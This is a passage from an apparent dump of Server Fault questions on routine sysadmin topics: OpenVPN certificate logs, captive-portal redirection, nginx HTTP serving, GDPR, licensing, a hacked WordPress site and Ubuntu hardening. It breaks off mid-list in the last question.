<pre><code>Tue May 09 16:33:20 2017 OpenVPN 2.4.1 x86_64-w64-mingw32 [SSL (OpenSSL)] [LZO] [LZ4] [PKCS11] [AEAD] built on Mar 22 2017
Tue May 09 16:33:20 2017 Windows version 6.1 (Windows 7) 64bit
Tue May 09 16:33:20 2017 library versions: OpenSSL 1.0.2k  26 Jan 2017, LZO 2.09
Tue May 09 16:33:20 2017 MANAGEMENT: TCP Socket listening on [AF_INET]127.0.0.1:25341
Tue May 09 16:33:20 2017 Need hold release from management interface, waiting...
Tue May 09 16:33:21 2017 MANAGEMENT: Client connected from [AF_INET]127.0.0.1:25341
Tue May 09 16:33:21 2017 MANAGEMENT: CMD 'state on'
Tue May 09 16:33:21 2017 MANAGEMENT: CMD 'log all on'
Tue May 09 16:33:21 2017 MANAGEMENT: CMD 'echo all on'
Tue May 09 16:33:21 2017 MANAGEMENT: CMD 'hold off'
Tue May 09 16:33:21 2017 MANAGEMENT: CMD 'hold release'
Tue May 09 16:33:21 2017 WARNING: No server certificate verification method has been enabled.  See http://openvpn.net/howto.html#mitm for more info.
Tue May 09 16:33:21 2017 TCP/UDP: Preserving recently used remote address: [AF_INET]***:1426
Tue May 09 16:33:21 2017 Socket Buffers: R=[8192-&gt;8192] S=[8192-&gt;8192]
Tue May 09 16:33:21 2017 UDP link local: (not bound)
Tue May 09 16:33:21 2017 UDP link remote: [AF_INET]***:1426
Tue May 09 16:33:21 2017 MANAGEMENT: &gt;STATE:1494344001,WAIT,,,,,,
Tue May 09 16:33:21 2017 MANAGEMENT: &gt;STATE:1494344001,AUTH,,,,,,
Tue May 09 16:33:21 2017 TLS: Initial packet from [AF_INET]***:1426, sid=fcf3759f 64e4b082
Tue May 09 16:33:21 2017 VERIFY OK: depth=2, C=GB, ST=Greater Manchester, L=Salford, O=COMODO CA Limited, CN=COMODO RSA Certification Authority
Tue May 09 16:33:21 2017 VERIFY OK: depth=1, C=GB, ST=Greater Manchester, L=Salford, O=COMODO CA Limited, CN=COMODO RSA Domain Validation Secure Server CA
Tue May 09 16:33:21 2017 VERIFY OK: depth=0, OU=Domain Control Validated, OU=PositiveSSL Wildcard, CN=*.opengw.net
Tue May 09 16:33:21 2017 Control Channel: TLSv1, cipher TLSv1/SSLv3 DHE-RSA-AES256-SHA, 2048 bit RSA
Tue May 09 16:33:21 2017 [*.opengw.net] Peer Connection Initiated with [AF_INET]***:1426
Tue May 09 16:33:23 2017 MANAGEMENT: &gt;STATE:1494344003,GET_CONFIG,,,,,,
Tue May 09 16:33:23 2017 SENT CONTROL [*.opengw.net]: 'PUSH_REQUEST' (status=1)
Tue May 09 16:33:23 2017 Key [AF_INET]***:1426 [0] not initialized (yet), dropping packet.
Tue May 09 16:33:23 2017 PUSH: Received control message: 'PUSH_REPLY,ping 3,ping-restart 10,ifconfig 10.211.1.5 10.211.1.6,dhcp-option DNS 10.211.254.254,dhcp-option DNS 8.8.8.8,route-gateway 10.211.1.6,redirect-gateway def1'
Tue May 09 16:33:23 2017 OPTIONS IMPORT: timers and/or timeouts modified
Tue May 09 16:33:23 2017 OPTIONS IMPORT: --ifconfig/up options modified
Tue May 09 16:33:23 2017 OPTIONS IMPORT: route options modified
Tue May 09 16:33:23 2017 OPTIONS IMPORT: route-related options modified
Tue May 09 16:33:23 2017 OPTIONS IMPORT: --ip-win32 and/or --dhcp-option options modified
Tue May 09 16:33:23 2017 Data Channel Encrypt: Cipher 'AES-128-CBC' initialized with 128 bit key
Tue May 09 16:33:23 2017 Data Channel Encrypt: Using 160 bit message hash 'SHA1' for HMAC authentication
Tue May 09 16:33:23 2017 Data Channel Decrypt: Cipher 'AES-128-CBC' initialized with 128 bit key
Tue May 09 16:33:23 2017 Data Channel Decrypt: Using 160 bit message hash 'SHA1' for HMAC authentication
Tue May 09 16:33:23 2017 interactive service msg_channel=312
Tue May 09 16:33:23 2017 ROUTE_GATEWAY 192.168.1.1/255.255.255.0 I=11 HWADDR=***
Tue May 09 16:33:23 2017 open_tun
</code></pre>

<p>Some servers have certificate errors. Here's a log:</p>

<pre><code>Tue May 09 16:54:53 2017 OpenVPN 2.4.1 x86_64-w64-mingw32 [SSL (OpenSSL)] [LZO] [LZ4] [PKCS11] [AEAD] built on Mar 22 2017
Tue May 09 16:54:53 2017 Windows version 6.1 (Windows 7) 64bit
Tue May 09 16:54:53 2017 library versions: OpenSSL 1.0.2k  26 Jan 2017, LZO 2.09
Tue May 09 16:54:53 2017 MANAGEMENT: TCP Socket listening on [AF_INET]127.0.0.1:25342
Tue May 09 16:54:53 2017 Need hold release from management interface, waiting...
Tue May 09 16:54:53 2017 MANAGEMENT: Client connected from [AF_INET]127.0.0.1:25342
Tue May 09 16:54:53 2017 MANAGEMENT: CMD 'state on'
Tue May 09 16:54:53 2017 MANAGEMENT: CMD 'log all on'
Tue May 09 16:54:53 2017 MANAGEMENT: CMD 'echo all on'
Tue May 09 16:54:53 2017 MANAGEMENT: CMD 'hold off'
Tue May 09 16:54:53 2017 MANAGEMENT: CMD 'hold release'
Tue May 09 16:54:53 2017 WARNING: No server certificate verification method has been enabled.  See http://openvpn.net/howto.html#mitm for more info.
Tue May 09 16:54:53 2017 MANAGEMENT: &gt;STATE:1494345293,RESOLVE,,,,,,
Tue May 09 16:54:54 2017 TCP/UDP: Preserving recently used remote address: [AF_INET]***:1777
Tue May 09 16:54:54 2017 Socket Buffers: R=[8192-&gt;8192] S=[8192-&gt;8192]
Tue May 09 16:54:54 2017 UDP link local: (not bound)
Tue May 09 16:54:54 2017 UDP link remote: [AF_INET]***:1777
Tue May 09 16:54:54 2017 MANAGEMENT: &gt;STATE:1494345294,WAIT,,,,,,
Tue May 09 16:54:54 2017 MANAGEMENT: &gt;STATE:1494345294,AUTH,,,,,,
Tue May 09 16:54:54 2017 TLS: Initial packet from [AF_INET]***:1777, sid=2bd721a1 2b3738b9
Tue May 09 16:54:54 2017 VERIFY ERROR: depth=0, error=self signed certificate: CN=Kanes-pc, O=Kanes-pc, OU=Kanes-pc, C=US
Tue May 09 16:54:54 2017 OpenSSL: error:14090086:SSL routines:ssl3_get_server_certificate:certificate verify failed
Tue May 09 16:54:54 2017 TLS_ERROR: BIO read tls_read_plaintext error
Tue May 09 16:54:54 2017 TLS Error: TLS object -&gt; incoming plaintext read error
Tue May 09 16:54:54 2017 TLS Error: TLS handshake failed
Tue May 09 16:54:54 2017 SIGUSR1[soft,tls-error] received, process restarting
Tue May 09 16:54:54 2017 MANAGEMENT: &gt;STATE:1494345294,RECONNECTING,tls-error,,,,,
Tue May 09 16:54:54 2017 Restart pause, 5 second(s)
</code></pre>

<p>Both servers are UK based, so the certificate in Log#1 seems accurate. Log#2 is where things don't add up for me.</p>

<p>Two questions derive from this:</p>

<ol>
<li>Is there a setting I can use within OpenVPN that would help me against MITM attacks when connecting to these servers? (I did read the info from the link provided but couldn't understand what setting is best to use and where to place it)</li>
<li>In regards to the certificate errors, any setting I can use within OpenVPN that would skip these errors and connect to the server?</li>
</ol>

<p>Thank you.  </p>
","<ssl-certificate><openvpn><certificate><certificate-authority><ssl-certificate-errors>","2017-05-09 16:15:02"
"1046355","Is there a webpage which tells me when the next version of PHP is planned for release?","<p>Before PHP 8.0.0 was released, I was eagerly awaiting it. It had an elaborate table detailed the planned release dates for the &quot;GA&quot; (final) version as well as all the betas/alphas/RCs. I unfortunately think this was just because it was a major new PHP version.</p>
<p>Now that I have tried PHP 8.0.0 and determined that it had a show-stopping bug, and reported that bug, and had it fixed, I'm eagerly awaiting 8.0.1 or 8.1.0 or whatever will be the next version of PHP.</p>
<p>Sadly, I've now looked through the entire PHP website without finding any such page.</p>
<p>Does it exist? PHP 8.0.0 was released &quot;26 Nov 2020&quot;, so it seems like it could be due soon, but I want to know (roughly) when.</p>
<p>The mailing lists seem completely dead and offer zero clue into the PHP development/plans.</p>
","<php>","2020-12-16 02:12:50"
"1046366","between ex4 and XFS which is better for large small files","<p>Between EXT4 and XFS which file system is better when an application uses multiple threads to read/write large amount of small files on a SSD.
From what I read</p>
<blockquote>
<p>In general, Ext3 or Ext4 is better if an application uses a single
read/write thread and small files, while XFS shines when an
application uses multiple read/write threads and bigger files</p>
</blockquote>
","<ext4><xfs>","2020-12-16 05:38:38"
"1046481","MX Record Status Connection Failed","<p>How to setup Windows Server MX Record then pointing to External Domain?<br>
I try to configure like this but always getting error<br>
<a href=""https://i.sstatic.net/lrWu5.png"" rel=""nofollow noreferrer"">Windows Server MX Record Configuration</a> <br>
<a href=""https://i.sstatic.net/TOmmb.png"" rel=""nofollow noreferrer"">Domain Hosting MX Record Configuration</a> <br>
<a href=""https://i.sstatic.net/bYBKJ.png"" rel=""nofollow noreferrer"">MX Record Lookup Failed</a></p>
","<windows><networking><active-directory><exchange><mx-record>","2020-12-16 17:46:27"
"923756","Trigger agreement page automatically when connecting to Captive Portal","<p>I have a WiFi hotspot setup using Hostapd and Dnsmasq. Everything works great, but I'm trying to trigger the sort of Terms and Conditions page you might see at a hotel or coffee shop after you connect to their captive portal. Most modern devices will automatically bring up this Terms and Conditions page immediately after connecting to one of these captive portal networks, which is what I'd like to happen after connecting to my hotspot.</p>

<p>As I understand it this is usually detected by the device by checking to see if a specific website returns a predictable response. For instance Google seems to test a connection to <code>http://clients1.google.com</code> and if it gets any response other than ""generate204"" it should trigger the captive portal agreement page. I've found two ways to redirect all traffic (and presumably these specific domains) to a web server running on my device...</p>

<p>One by adding the following line to <code>/etc/dnsmasq.conf</code>:</p>

<pre><code>address=/#/10.0.0.1
</code></pre>

<p>and the other by using <code>iptables</code>. This triggers from a script on boot:</p>

<pre><code>iptables -t nat -A PREROUTING -d 0/0 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1
</code></pre>

<p>Both succeed in redirecting all traffic to <code>10.0.0.1</code> (which is the correct address for the local web server) when manually entering a url into the browser, but the page doesn't open automatically upon connecting to the access point.</p>

<p>I've also tried manually adding entries for specific google URL's like:</p>

<pre><code>address=/clients1.google.com/10.0.0.1
</code></pre>

<p>into the <code>/etc/dnsmasq.conf</code> with no luck. I've run out of ideas, any suggestions.</p>
","<iptables><linux-networking><dnsmasq><captive-portal><hostapd>","2018-07-27 02:18:21"
"1046524","Synthesize A records when only having AAAA","<p>I'm hosting some things from my home network and my ISP doesn't provide me with an IPv4 address. Not with a way to port forward to it anyway.</p>
<p>I've got my servers running using IPv6 and everything works great, until I had to share things with the 60+% of the world who don't have IPv6 yet.</p>
<p>How can I make my website and servers accessible to everybody? How can I synthesize having a dual stack DNS solution while only being able to use IPv6? I'm using CloudFlare as my DNS in case it matters.</p>
<p>P.S. I'm aware of DNS64 but I don't think that's what I'm looking for right? I also did a tiny bit of research into DNS46 but the truth is I don't understand it at all.</p>
","<domain-name-system><ipv6><ipv4>","2020-12-17 02:52:30"
"1046581","Is it possible to install Kubernetes manually in my existing GCP VM instance?","<p>I am a newbie in Kubernetes. I have hosted my microservice application on the GCP VM instance. I want to use Kubernetes for deploying, managing, and scaling my applications. GCP provides GKE for that, but if I don't want to use that and installing Kubernetes manually in my existing VM instance.</p>
<p>Is it possible and how to install Kubernetes manually in my existing GCP VM instance?</p>
","<google-cloud-platform><kubernetes><google-kubernetes-engine>","2020-12-17 11:39:55"
"1046600","Multiple Audiodevices in RDP Session","<p>I have bought a really nice headset. Which registers two audiodevices at my computer (Windows). This is so i can use one for music and one for teamspeak, etc. It has a little balancewheel that enables the user to make one channel louder then the other or vice versa.</p>
<p>I would really like to use that feature. The only problem ist, that I want to use it in an RDP session which even with RemoteAudio enabled only allows me to use one of the two devices.</p>
<p>Is there any way around that?</p>
","<windows><rdp><audio>","2020-12-17 14:30:30"
"849530","Something is setting IPSec policies and Firewall Rules. How can I find it? (Windows 2008R2)","<p>Something on the server is automatically adding Deny rules on port 445 and a couple other ports. The rules are appearing in the Firewall and IP Security policies. They are blocking network and printer sharing. </p>

<p>I have tried renaming, disabling, deleting the rules/policies but they come back on their own.</p>

<p>I have done virus scans on 3 different AV programs (Windows Defender, Kaspersky, Malwarebytes) and they have come back clean. I've uninstalled ALL unnecessary programs. I have check ALL scheduled tasks, and they are appropriate. I have checked ALL startup tasks (Startup folder and registry run/runonce), nothing in them. There are no GPO's set. No VNC/RDP services, so it's not someone doing it manually. </p>

<p>I've been able to stop the rules/policies automatically being added by setting the Permission in the registry folders of the Firewall rules and IP Sec policies to (Everyone to Deny creating/changing/deleting).</p>

<p>How can I pinpoint what is setting these rules/policies?!? The event viewer simply says the Local Service user used netsh to create the rules, but no details on where netsh was called. Nothing in the even viewer about IP Sec policies, but I've recently enable auditing, but nothing in there helps. </p>
","<windows-server-2008-r2><firewall><ipsec><malware>","2017-05-11 14:45:52"
"849532","Trying to understand Microsoft SQL and Windows Server licensing","<p>I'm trying to understand how many licenses I'm supposed to purchase and check if I have the correct amount of purchased licenses.
I have Windows Servers &amp; SQL Servers in virtual environment.</p>

<p>From my understanding:</p>

<hr>

<p>Windows Server only:</p>

<p>Server with Windows Server – the license is 'Per CPU'. </p>

<p>A Server with 1 CPU &amp; 2 Cores total - need 1 windows license.</p>

<p>A Server with 2 CPU &amp; 4 Cores total - need 2 windows license.</p>

<p>A Server with 2 CPU &amp; 8 Cores total  - need 2 windows license.</p>

<hr>

<p>SQL Server:</p>

<p>A server with SQL server – The license is 'Per CORE'.</p>

<p>Also needed Windows Server license, amount depends on the number of CPU.</p>

<p>A Server with 1 CPU &amp; 2 Core total – need 2 SQL licenses.</p>

<p>A Server with 1 CPU &amp; 4 Core total – need 2 SQL licenses.</p>

<p>A Server with 2 CPU &amp; 8 Core total – need 4 SQL licenses.</p>

<p>A Server with 2 CPU &amp; 12 Core total – need 6 SQL licenses.</p>

<hr>

<p>Please let me know if my example is correct, So I can be sure I understand the licensing as needed.</p>

<p>Thank you!</p>
","<windows><sql><licensing>","2017-05-11 14:49:25"
"1046702","How should a US based server avoid GDPR?","<p>The last time I built a serious website was back in the early 90s.  Web construction back then was straightforward -- build the site and publish for the world to access.</p>
<p>Today's web technology has vastly improved, but various artificial impediments seem to have been introduced. Today's question revolves around GDPR.</p>
<p>As I understand it, GDPR is European legislation advertised as protecting EU citizen's privacy and granting EU citizens rights to control how websites use data/whether the websites can store said data.</p>
<p>My initial impression of GDPR is that if an EU citizen wants GDPR rights, they should only use servers residing in the EU which would be subject to GDPR legislation.</p>
<p>However, there apparently is some notion that EU legislation can somehow affect servers outside of the EU? I'm not a lawyer, but I would expect that each nation defines and enforces their own laws -- which may or may not be in alignment with another nation's legislation.  How is GDPR even applicable to servers residing in the US (or any other non-EU nation?)</p>
<p>Based on several articles I've read online, it seems somehow the US allows EU's GDPR legislation to be enforced on US soil. That seems like mistake #1, but I digress.</p>
<p>Since I don't want to deal with GDPR headaches, I seemingly have no choice but to block all EU users from using my websites and services.  What is the best way to block them? Have them affirm when attempting to logon to the website that they are not an EU citizen (or are they allowed to consent to the website not adhering to the GDPR scheme, in which case they could still use it?)</p>
<p>To be clear, my websites and services are not planning to use any information collected from visitors for spam or any other nefarious purpose -- I just don't want to deal with any of the GDPR requirements and I am willing to block/forbid all EU users from using my sites and services in exchange.</p>
<p>Ideally, I would prefer the old days where everyone in the world can access the resources I make available, but if that is not possible a legal means to forbid EU citizens access (such that if they violated the legal directive, GDPR expectation would be void) is fine.</p>
<p>Thanks in advance for any ideas/approaches you might use for your websites and services.</p>
","<gdpr>","2020-12-18 05:44:09"
"923932","Crontab is not working in centos 7","<p>I am trying to setup crontab in my centos 7. I have /etc/crontab file is like below.</p>

<pre><code>SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
*/5 * * * * root /php /root/Downloads/chat/pass.php &gt;/dev/null 2&gt;&amp;1
# For details see man 4 crontabs
</code></pre>

<p>I want run my pass.php file every 5 minutes. I was able to setup cron in cpanel but I am new in centos 7 and don't know what is wrong in my file or command. I have checked that my cron service is running file. Let me know if there something wrong in it or How can I get log file of cron service.</p>

<p>Thanks</p>
","<centos7><cron>","2018-07-28 16:32:06"
"849591","How to make nginx serve on HTTP","<p>I have an nginx instance that serves everything fine on HTTPS but not on HTTP. </p>

<p>When I go to <code>http://myserver.com/something</code> then it just hands, however, if I go to <code>https://myserver.com/something</code> then it serves the page. </p>

<p>This is how my paths look for <code>sites-available</code></p>

<pre><code>root@myserver:~# ls -al /etc/nginx/sites-available/
total 28
drwxr-xr-x 3 root root 4096 May 11 15:37 .
drwxr-xr-x 7 root root 4096 Feb 11 22:46 ..
-rw-r--r-- 1 root root  586 Oct  6  2015 default
-rw-r--r-- 1 root root 1901 Oct  6  2015 default.orig
drwxr-xr-x 2 root root 4096 May 11 15:30 locations
-rw-r--r-- 1 root root 1460 May 11 15:37 ssl_proxy
</code></pre>

<p>This is my path for <code>sites-enabled</code></p>

<pre><code>root@myserver:~# ls -al /etc/nginx/sites-enabled/
total 8
drwxr-xr-x 2 root root 4096 May 11 15:32 .
drwxr-xr-x 7 root root 4096 Feb 11 22:46 ..
lrwxrwxrwx 1 root root   28 Jun 29  2016 ssl_proxy -&gt; ../sites-available/ssl_proxy
</code></pre>

<p>My <code>ssl_proxy</code> looks like this:</p>

<pre><code>server {
    listen 443 ssl default_server;
    listen [::]:443 ssl default_server;

    ssl_certificate /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;
    ssl_dhparam /etc/nginx/ssl/dhparam.pem;
    ssl_trusted_certificate /etc/nginx/ssl/ca.pem;

    ssl_session_timeout 1d;
    ssl_session_cache shared:SSL:50m;
    ssl_session_tickets off;


    # modern configuration. tweak to your needs.
    ssl_protocols TLSv1.2;
    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256';
    ssl_prefer_server_ciphers on;

    # HSTS (ngx_http_headers_module is required) (15768000 seconds = 6 months)
    add_header Strict-Transport-Security max-age=15768000;

    # OCSP Stapling ---
    # fetch OCSP records from URL in ssl_certificate and cache them
    ssl_stapling on;
    ssl_stapling_verify on;


    resolver &lt;ipaddress_here&gt;;

    include /etc/nginx/sites-available/locations/*.conf;
}
</code></pre>

<p><strong>Question</strong></p>

<p>How can I have <code>http</code> be served as well?</p>
","<nginx>","2017-05-11 19:44:49"
"924087","moving 4g AIX server to 6520 brocade switch, i/o errors on host","<p>Recently tried to move several HP Unix (AIX) servers from an old 5300 brocade switch fabric to new 6520 brocade fabric. The old zones were inactivated and old storage port id's were kept intact for failover should problems occur, the new storage ports were activated but the servers are encountering large volume of i/o errors? Also the old switches were running 6.4 FOS and new switches are running 7.4.2a if that means anything. Thank You in advance</p>
","<storage-area-network>","2018-07-30 11:46:55"
"849772","Is there a way to get the host of an SSH request in an SSH server?","<p>I'm writing a custom SSH server. Whenever I connect to it via <code>ssh user@subdomain.example.com</code>, I need to know the value of the subdomain.</p>

<p>Right now I can only get remote and local IP addresses.</p>
","<ssh><host>","2017-05-12 15:30:56"
"1046997","Dell 2950 Disk Partition Format System Install","<p>Have three 2950 Servers. Got them here and there. Fixed all the little problems. All are posting.  Have new SAS drives.  I need to format and partition them.</p>
<p>How do you get raw SAS drives formatted and partitioned.  Let me add, they are 3TB so need one a 2G part and a 1G ??  Manual says will only take 2G drive.  Don't want to get all elaborate and upgrade to H700.  If these drives won't work, I just buy some smaller ones.</p>
<p>Still, can't figure out how to format without install and can't install w/o format.</p>
","<partition><format>","2020-12-21 05:02:23"
"849796","Hacked by blackwave","<p>The last week my website got hacked by blackwave and im really confused about it , the confusing is that i can log in to my wordpress dashboard but without any permissions , i cant do nothing about it , like someone missed or changed the wp-config.php or wp-login.php or i dont know please i really need the file that i have to edit and get the real php script of wp-config and wp-login , can you guys help me ? Thanks alot i really appreciate it if u helped me. this is my website : <a href=""http://brand-samara.ru"" rel=""nofollow noreferrer"">http://brand-samara.ru</a></p>
","<linux>","2017-05-12 17:17:51"
"974156","CentOS 6 to RHEL 8: Migrate to New Hardware then Upgrade OS -OR- Upgrade OS then Migrate to New Hardware","<p>I have to migrate five physical servers (Dell R510) to new physical hardware (Dell R440) and, also, upgrade them from CentOS 6.2 to the latest RHEL OS. Which is the best route?</p>

<ol>
<li><p>Migrate the servers to the new hardware then upgrade the OS?</p></li>
<li><p>Upgrade the OS then migrate to the new hardware?</p></li>
<li><p>Why?</p></li>
</ol>

<p>Also, any suggestions on the most reliable method to migrate to the new hardware would be greatly appreciated.</p>

<p>Thanks.</p>
","<linux><centos><redhat><migration><upgrade>","2019-07-05 22:17:03"
"974185","Many requests over port 445 on Ubuntu VPS, what could it mean?","<p>I own a small VPS hosted by Hetzner on which i run a small Minecraft game server. The VPS is running on Ubuntu, and the only software i installed are Java JRE and the required software to run a Minecraft game server (+ additional plugins).</p>

<p>I ran a tcpdump over night and here is the result:
<a href=""https://drive.google.com/open?id=15hYd2QzREAW_d8KodLyVhUVleu1OxCYz"" rel=""nofollow noreferrer"">https://drive.google.com/open?id=15hYd2QzREAW_d8KodLyVhUVleu1OxCYz</a></p>

<p>Could anyone help me read it?</p>

<p>Is it regular?</p>

<p>First of july i received a mail from abuse@hetzner.com (my host) stating that Columbia University sent them an automated notice regarding unwanted traffic coming from my ip address.</p>

<p>Here is the original Columbia University message: <a href=""https://pastebin.com/3kMy98kw"" rel=""nofollow noreferrer"">https://pastebin.com/3kMy98kw</a></p>

<p>But it also said:</p>

<blockquote>
  <p>It is possible that this alert is the result of a reflection attack against your network with a spoofed origin matching Columbia
  University's network.   Details are provided below.  Please take all
  necessary steps to mitigate such attacks, or ignore this notice if
  this traffic is spoofed.</p>
</blockquote>

<p>So could that be just a random occourrence? Or is my server hacked?</p>
","<port><hacking><tcpdump><spoofing>","2019-07-06 10:28:46"
"849985","How to do Fixed length subnetting?","<p>This was an exam question last year, and I was trying to figure out how to get the answer:</p>

<p>A small company is assigned the class C network 205.67.35.0. You need to divide this network to provide subnets for three departments using fixed-length subnetting. The departments are approximately the same size. Show the network and broadcast addresses for each subnet. Show the slash notation. How many hosts are on each subnet? Are the resulting subnets class C networks?</p>

<p>How would you go about doing this? How would you start it?</p>
","<subnet><ipv4>","2017-05-14 04:16:22"
"974399","Documenting Source Code - Microsoft Word","<p>I'm an intern and I had the opportunity to design and configure an ""application server"" for my company. It has a variety of important scripts and as part of my process to put it into production I want to document everything for when control needs to be assigned to someone so they understand how everything works.</p>

<p>We're sort of old-fashioned here so we do want to keep a .docx (will likely be converted to .pdf later but I'm working in Word) of the documentation, so I wanted to ask about documenting source code. There's about 40~ pages of it and long-story short it just looks really ugly when I paste it into word. </p>

<p>Presently I'm pasting it into WordPad because it keeps a more simple format to the text while retaining indentation and linebreaks. What's the go-to method for keeping source code? The files themselves have all been backed up but I also need the code on paper.</p>

<p>Thanks.</p>
","<linux><documentation>","2019-07-08 16:52:53"
"850033","Check Used Ports on Linux without Command","<p>Is there a way to check Used Ports on Linux without commands, I mean checking files or so on ?</p>
","<linux><netstat><lsof>","2017-05-14 14:09:08"
"1047285","Server architecture for high traffic system","<p>we are working on the online exam system, which supposed to have much traffic at the same times, more than 15000 students will log in and make an exam at the same time,
we are developing this system using laravel + MySQL database.
recently we purchase a dedicated server with 64G ram, 42 core.
what is the best architecture for this dedicated server to handle these many requests at the same time , I am thinking to install containers inside that server and split it as</p>
<blockquote>
<p>2 containers as web servers with Nginx and apply load balance between
them using haproxy . 2 for MySQL database and apply load balancing. 1
for cache server using Redis server</p>
</blockquote>
<p>but I am not sure if this way is good or not.
please advise me to handle this issue, I am waiting for your recommendation
best regards</p>
","<linux><nginx><haproxy><dedicated-server><laravel>","2020-12-23 06:54:31"
"850106","MySQL rolling backups","<p>I want to backup MySQL hourly, but only keep one days worth of backups and the. Start the process again.</p>

<p>How would I do that?</p>
","<ubuntu><mysql>","2017-05-15 06:48:03"
"1047468","What will I need to create a web server out of an R710?","<p>I recently got hold of an R710 (DELL PowerEdge) &amp; want to use it to host multiple sites.</p>
<p>I did not come with any HDD’s but I was told I need one with Windows Server.</p>
<p>I currently host my sites on a Linux VPS due to SSH ease, is it possible to just store a standard Linux OS (like Ubuntu 18.04) on a USB drive &amp; plug it in internally to boot an OS? Or will I need a HDD?</p>
<p>If so, could anyone point me in the direction of one compatible and how I’d virtually mount them in the BIOS?</p>
<p>I appreciate it</p>
","<linux><windows><ubuntu-18.04><sas><rack>","2020-12-24 14:55:54"
"974622","How to choose server region?","<p>How can I determine which server region to have a user connect to? If I have servers in 5 different regions, should I just send out 5 pings and choose the server that got back the fastest?</p>
","<cloud>","2019-07-10 06:11:08"
"974627","Insecure Site Warning with CNAME Alias","<p>For example I have a domain www.store.com which provides sub stores to clients as subdomains client1.store.com, client2.store.com etc..I am using wildcard ssl certificate for store.com and all subdomains.</p>

<p>My client store 1, has a main site and they provide their store site as store.clientsite.com which displays our subdomain for the client. They add a CNAME record in their DNS for store.clientsite.com with alias as client1.store.com.</p>

<p>In my store.com site for the subdomain client1.store.com we add in apache config, Server as  client1.store.com and Server Alias as store.clientsite.com in the apache config. </p>

<p>It works perfectly as <a href=""http://store.clientsite.com"" rel=""nofollow noreferrer"">http://store.clientsite.com</a>, but with <a href=""https://store.clientsite.com"" rel=""nofollow noreferrer"">https://store.clientsite.com</a> the browser is displaying a warning. The client has tried it with no ssl added and with wild card SSL added. Both gives same result.</p>

<p>If we need to display the https:// site by Redirect permanent / <a href=""https://client1.store.com/"" rel=""nofollow noreferrer"">https://client1.store.com/</a> the <a href=""http://store.clientsite.com"" rel=""nofollow noreferrer"">http://store.clientsite.com</a> url gets redirected to <a href=""https://client1.store.com"" rel=""nofollow noreferrer"">https://client1.store.com</a>. So it is not possible.</p>

<p>How is it possible to display <a href=""https://store.clientsite.com"" rel=""nofollow noreferrer"">https://store.clientsite.com</a> with CNAME alias client1.store.com without displaying browser warning and in https://.</p>

<p>Help requested from experts. </p>
","<ssl><subdomain><cname-record><wildcard-subdomain>","2019-07-10 06:30:20"
"850283","New Ubuntu Server best practice for setup","<p>When setting up droplets on Digital Ocean it is encouraged to setup some basic security and monitoring. I have read around quite a lot recently on best practices for hardening a new Ubuntu server. Below are the steps I have compiled. Does the community have any suggestions for tweaks to this list including additions or removals?</p>

<ol>
<li>Create a non-root user [<a href=""https://www.digitalocean.com/community/questions/what-do-you-do-with-your-first-five-minutes-on-a-new-server"" rel=""noreferrer"">2</a>, <a href=""https://ryaneschinger.com/blog/securing-a-server-with-ansible/"" rel=""noreferrer"">3</a>, <a href=""https://www.linode.com/docs/security/securing-your-server"" rel=""noreferrer"">7</a>, <a href=""https://support.rackspace.com/how-to/linux-server-security-best-practices/"" rel=""noreferrer"">8</a>]</li>
<li>Add non-root to the sudoers group [<a href=""https://www.digitalocean.com/community/questions/what-do-you-do-with-your-first-five-minutes-on-a-new-server"" rel=""noreferrer"">2</a>, <a href=""https://ryaneschinger.com/blog/securing-a-server-with-ansible/"" rel=""noreferrer"">3</a>, <a href=""https://support.rackspace.com/how-to/linux-server-security-best-practices/"" rel=""noreferrer"">8</a>]</li>
<li>Add public ssh key to non-root user [<a href=""https://www.digitalocean.com/community/tutorials/7-security-measures-to-protect-your-servers"" rel=""noreferrer"">1</a>, <a href=""https://www.digitalocean.com/community/questions/what-do-you-do-with-your-first-five-minutes-on-a-new-server"" rel=""noreferrer"">2</a>, <a href=""https://ryaneschinger.com/blog/securing-a-server-with-ansible/"" rel=""noreferrer"">3</a>, <a href=""https://support.rackspace.com/how-to/linux-server-security-best-practices/"" rel=""noreferrer"">8</a>]</li>
<li>Deny all inbound traffic with ufw firewall [<a href=""https://www.digitalocean.com/community/tutorials/7-security-measures-to-protect-your-servers"" rel=""noreferrer"">1</a>, <a href=""https://ryaneschinger.com/blog/securing-a-server-with-ansible/"" rel=""noreferrer"">3</a>, <a href=""https://github.com/MartynKeigher/ghost-on-digitalocean-512MB"" rel=""noreferrer"">4</a>, <a href=""https://www.linode.com/docs/security/securing-your-server"" rel=""noreferrer"">7</a>]</li>
<li>Open required ports within the ufw firewall [<a href=""https://www.digitalocean.com/community/tutorials/7-security-measures-to-protect-your-servers"" rel=""noreferrer"">1</a>, <a href=""https://ryaneschinger.com/blog/securing-a-server-with-ansible/"" rel=""noreferrer"">3</a>, <a href=""https://github.com/MartynKeigher/ghost-on-digitalocean-512MB"" rel=""noreferrer"">4</a>, <a href=""https://www.linode.com/docs/security/securing-your-server"" rel=""noreferrer"">7</a>]</li>
<li>Update SSH config - Password-less logins [<a href=""https://www.digitalocean.com/community/questions/what-do-you-do-with-your-first-five-minutes-on-a-new-server"" rel=""noreferrer"">2</a>, <a href=""https://ryaneschinger.com/blog/securing-a-server-with-ansible/"" rel=""noreferrer"">3</a>, <a href=""https://www.linode.com/docs/security/securing-your-server"" rel=""noreferrer"">7</a>, <a href=""https://support.rackspace.com/how-to/linux-server-security-best-practices/"" rel=""noreferrer"">8</a>, <a href=""https://support.asperasoft.com/hc/en-us/articles/221494788-Best-practices-for-SSH-configuration"" rel=""noreferrer"">9</a>]</li>
